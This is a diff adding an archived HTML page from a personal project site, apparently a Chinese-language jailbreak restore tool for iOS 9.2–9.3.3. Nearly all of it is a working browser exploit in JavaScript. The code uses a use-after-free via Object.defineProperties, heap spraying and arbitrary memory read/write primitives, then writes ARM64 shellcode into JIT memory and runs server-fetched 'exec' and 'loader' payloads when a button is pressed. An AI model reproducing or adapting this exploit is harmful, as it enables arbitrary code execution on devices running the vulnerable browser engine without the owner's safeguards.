@@ -1,0 +1,283 @@
+<!doctype html>
+<html lang="zh-Hans"><head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<meta name="viewport" content="user-scalable=1.0,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
+	<meta name="apple-mobile-web-app-capable" content="no">
+	<meta name="format-detection" content="telephone=no">
+	
+	
+	<meta name="apple-mobile-web-app-title" content="JailbreakMe">
+	<title>Jailbreak Restore | RANDOM LINEAR SPACE</title>
+	<link rel="stylesheet" href="../assets/projects.css">
+	<style>
+	body.project-page { min-height:100vh; padding:0; margin:0; text-align:center; background: radial-gradient(circle at 50% 0%, rgba(49, 183, 232, 0.16), transparent 38%), var(--project-bg); }
+	p { padding:0; margin:0 }
+	.jailbreak-shell { width:min(720px, calc(100vw - 32px)); margin:0 auto; padding:150px 0 80px; }
+	.text { padding:36px 28px; border:1px solid var(--project-line); border-radius:6px; background:var(--project-panel); box-shadow:var(--project-shadow); text-align:center; }
+	.text p { font-size:18px; line-height:32px; color:var(--project-ink); }
+	.text p.t { max-width:520px; margin:12px auto 0; font-size:14px; color:var(--project-muted); }
+	.go { display:inline-flex; align-items:center; justify-content:center; margin:34px auto 0; min-width:170px; min-height:44px; padding:0 18px; border:1px solid var(--project-accent); border-radius:4px; color:#fff; background:var(--project-accent-strong); font-size:15px; font-weight:700; text-decoration:none; text-transform:uppercase; }
+	.go:hover { background:var(--project-accent); }
+	</style>
+</head>
+<body class="project-page">
+
+<nav class="project-nav is-solid" aria-label="Project navigation">
+	<a class="project-brand" href="../main.html">Projects</a>
+	<div class="project-nav-links">
+		<a href="/blog/">Blog</a>
+		<a href="../main.html#jailbreak">Back</a>
+	</div>
+</nav>
+
+<main class="jailbreak-shell">
+<div class="text">
+    <p>iOS 9 越狱修复工具</p>
+    <p>此页面可以修复</p>
+    <p>系统为 iOS9.2 - iOS9.3.3 的越狱</p>
+    <p class="t">这是旧博客迁移保留的历史页面。只应在对应的旧设备和旧系统版本上使用，现代浏览器大概率不会执行成功。</p>
+</div>
+<a class="go" href="javascript:go()" id="go">开始越狱</a>
+</main>
+
+<script>
+ function load_binary_resource(url) {
+	 var req = new XMLHttpRequest();
+	 req.open('GET', url, false);
+	 req.overrideMimeType('text\/plain; charset=x-user-defined');
+	 req.send(null);
+	 if (req.status != 200) {
+		 document.write("不能加载越狱程序");
+		 stop = 1
+ 	};
+	 return req.responseText;
+ }
+ var mem0 = 0;
+ var mem1 = 0;
+ var mem2 = 0;
+
+ function read4(addr) {
+	 mem0[4] = addr;
+	 var ret = mem2[0];
+	 mem0[4] = mem1;
+	 return ret;
+ }
+
+ function write4(addr, val) {
+	 mem0[4] = addr;
+	 mem2[0] = val;
+	 mem0[4] = mem1;
+ }
+ filestream = load_binary_resource("exec")
+ var shll = new Uint32Array(filestream.length / 4);
+ for (var i = 0; i< filestream.length;) {
+			var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i + 1) & 0xff)<< 8) | ((filestream.charCodeAt(i + 2) & 0xff)<< 16) | ((filestream.charCodeAt(i + 3) & 0xff)<< 24);
+			shll[i / 4] = word;
+			i += 4;
+		}
+ var print = alert;
+ _dview = null;
+
+ function u2d(low, hi) {
+	 if (!_dview) _dview = new DataView(new ArrayBuffer(16));
+	 _dview.setUint32(0, hi);
+	 _dview.setUint32(4, low);
+	 return _dview.getFloat64(0);
+ }
+ var pressure = new Array(100);
+ var bufs = new Array(10000);
+ dgc = function() {
+	 for (var i = 0; i< pressure.length; i++) {
+		 pressure[i] = new Uint32Array(0x10000);
+	 }
+ 	for (var i = 0; i< pressure.length; i++) {
+		 pressure[i] = 0;
+	 }
+ }
+
+ function swag() {
+	 if (bufs[0]) return;
+	 dgc();
+	 dgc();
+	 dgc();
+	 dgc();
+	 dgc();
+	 dgc();
+	 dgc();
+	 dgc();
+	 for (i = 0; i< bufs.length; i++) {
+		 bufs[i] = new Uint32Array(0x100 * 2)
+ 		for (k = 0; k< bufs[i].length;) {
+			bufs[i][k++] = 0x41414141;
+			bufs[i][k++] = 0xffff0000;
+		}
+ 	}
+ }
+ var trycatch = "";
+ for (var z = 0; z< 0x2000; z++) trycatch += "try{} catch(e){}; ";
+ var fc = new Function(trycatch);
+ var fcp = 0;
+ var smsh = new Uint32Array(0x10)
+
+ function smashed(stl) {
+	 document.body.innerHTML = "win! " + smsh.length;
+	 var jitf = (smsh[(0x10 + smsh[(0x10 + smsh[(fcp + 0x18) / 4]) / 4]) / 4]);
+	 write4(jitf, 0xd28024d0);
+	 write4(jitf + 4, 0x58000060);
+	 write4(jitf + 8, 0xd4001001);
+	 write4(jitf + 12, 0xd65f03c0);
+	 write4(jitf + 16, jitf + 0x20);
+	 write4(jitf + 20, 1);
+	 fc();
+	 var dyncache = read4(jitf + 0x20);
+	 var dyncachev = read4(jitf + 0x20);
+	 var go = 1;
+	 while (go) {
+		 if (read4(dyncache) == 0xfeedfacf) {
+			 for (i = 0; i< 0x1000 / 4; i++) {
+				 if (read4(dyncache + i * 4) == 0xd && read4(dyncache + i * 4 + 1 * 4) == 0x40 && read4(dyncache + i * 4 + 2 * 4) == 0x18 && read4(dyncache + i * 4 + 11 * 4) == 0x61707369) // lulziest mach-o parser ever
+				 {
+					 go = 0;
+					 break;
+				 }
+			 }
+		 }
+		 dyncache += 0x1000;
+	 }
+	 dyncache -= 0x1000;
+	 var bss = [];
+	 var bss_size = [];
+	 for (i = 0; i< 0x1000 / 4; i++) {
+		 if (read4(dyncache + i * 4) == 0x73625f5f && read4(dyncache + i * 4 + 4) == 0x73) {
+			 bss.push(read4(dyncache + i * 4 + (0x20)) + dyncachev - 0x80000000);
+			 bss_size.push(read4(dyncache + i * 4 + (0x28)));
+		 }
+	 }
+	 var shc = jitf;
+	 var filestream = load_binary_resource("loader")
+ 	for (var i = 0; i< filestream.length;) {
+		 var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i + 1) & 0xff)<< 8) | ((filestream.charCodeAt(i + 2) & 0xff)<< 16) | ((filestream.charCodeAt(i + 3) & 0xff)<< 24);
+		 write4(shc, word);
+		 shc += 4;
+		 i += 4;
+	 }
+ 	jitf &= ~0x3FFF;
+ 	jitf += 0x8000;
+ 	write4(shc, jitf);
+ 	write4(shc + 4, 1);
+ 	// copy macho
+ 	for (var i = 0; i< shll.length; i++) {
+		 write4(jitf + i * 4, shll[i]);
+	 }
+ 	alert("已完成，请关闭此提示，并锁定屏幕以继续")
+ 	for (var i = 0; i< bss.length; i++) {
+		 for (k = bss_size[i] / 6; k< bss_size[i] / 4; k++) {
+			 write4(bss[i] + k * 4, 0);
+		 }
+	 }
+ 	fc();
+ 	alert(2);
+ }
+
+ function go() {
+	 document.getElementById('go').innerHTML = "越狱中...";
+	 dgc();
+	 setTimeout(go_, 400);
+ }
+
+ function go_() {
+	 if (smsh.length != 0x10) {
+		 smashed();
+		 return;
+	 }
+	 dgc();
+	 var arr = new Array(0x100);
+ 	var yolo = new ArrayBuffer(0x1000);
+ 	arr[0] = yolo;
+ 	arr[1] = 0x13371337;
+ 	var not_number = {};
+ 	not_number.toString = function() {
+		arr = null;
+		props["stale"]["value"] = null;
+		swag();
+		return 10;
+	};
+ 	var props = {
+		 p0: {
+			 value: 0
+ 		},
+		 p1: {
+			 value: 1
+ 		},
+		 p2: {
+			 value: 2
+ 		},
+		 p3: {
+			 value: 3
+ 		},
+		 p4: {
+			 value: 4
+ 		},
+		 p5: {
+			 value: 5
+ 		},
+		 p6: {
+			 value: 6
+ 		},
+		 p7: {
+			 value: 7
+ 		},
+		 p8: {
+			 value: 8
+ 		},
+		 length: {
+			 value: not_number
+ 		},
+		 stale: {
+			 value: arr
+ 		},
+		 after: {
+			 value: 666
+ 		}
+	 };
+ 	var target = [];
+ 	var stale = 0;
+ 	var before_len = arr.length;
+ 	Object.defineProperties(target, props);
+ 	stale = target.stale;
+ 	stale[0] += 0x101;
+ 	stale[1] = {}
+ 	for (var z = 0; z< 0x1000; z++) fc();
+ 	for (i = 0; i< bufs.length; i++) {
+		for (k = 0; k< bufs[0].length; k++) {
+			if (bufs[i][k] == 0x41414242) {
+				stale[0] = fc;
+				fcp = bufs[i][k];
+				stale[0] = {
+					'a': u2d(105, 0x1172600),
+ 					'b': u2d(0, 0),
+ 					'c': smsh,
+ 					'd': u2d(0x100, 0)
+ 				}
+ 				stale[1] = stale[0]
+ 				bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
+ 				bck = stale[0][4];
+ 				stale[0][4] = 0; // address, low 32 bits
+ 				// stale[0][5] = 1; // address, high 32 bits == 0x100000000
+ 				stale[0][6] = 0xffffffff;
+ 				mem0 = stale[0];
+ 				mem1 = bck;
+ 				mem2 = smsh;
+ 				bufs.push(stale)
+ 				if (smsh.length != 0x10) {
+					smashed(stale[0]);
+				}
+ 				return;
+ 			}
+		}
+	}
+ 	document.location.reload();
+ }
+</script>
+
+</body></html>
